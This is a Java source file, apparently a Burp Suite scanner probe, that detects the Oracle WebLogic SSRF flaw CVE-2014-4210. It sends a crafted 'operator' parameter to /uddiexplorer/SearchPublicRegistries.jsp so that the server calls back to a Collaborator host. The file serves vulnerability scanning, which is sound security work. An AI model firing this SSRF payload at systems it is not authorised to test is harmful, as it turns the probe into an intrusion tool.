package probes;

import burp.*;

import java.util.concurrent.TimeUnit;

public class CVE_2014_4210 extends Probe {
    private static final String NAME = "CVE-2014-4210";
    private static final String SEVERITY = "Medium";
    private static final String DESC = "SSRF vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.0.2.0 and 10.3.6.0.";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String path = "/uddiexplorer/SearchPublicRegistries.jsp";

        IHttpRequestResponse checkReqResp = getReq(requestResponse.getHttpService(), path);

        if (Utilities.getStatus(checkReqResp) == 200) {
            IExtensionHelpers h = Utilities.helpers;
            String pollPayload = Utilities.collaborator.generatePayload(true);
            byte[] req = checkReqResp.getRequest();
            req = h.addParameter(req, h.buildParameter("rdoSearch", "name", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("txtSearchname", "sdf", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("btnSubmit", "Search", IParameter.PARAM_URL));
            req = h.addParameter(req, h.buildParameter("operator", "http://" + pollPayload + "/55rf", IParameter.PARAM_URL));

            Utilities.callbacks.makeHttpRequest(checkReqResp.getHttpService(), req);
            try {
                TimeUnit.SECONDS.sleep(3);
            } catch (InterruptedException e) {
                e.printStackTrace(Utilities.err);
            }

            String detail = Utilities.fetchInteraction(pollPayload);

            if (detail.length() > 0)
                return new WebLogicIssue(
                        checkReqResp,
                        NAME,
                        DESC + "<br/><br/>" + detail,
                        SEVERITY);
        }

        return null;
    }
}
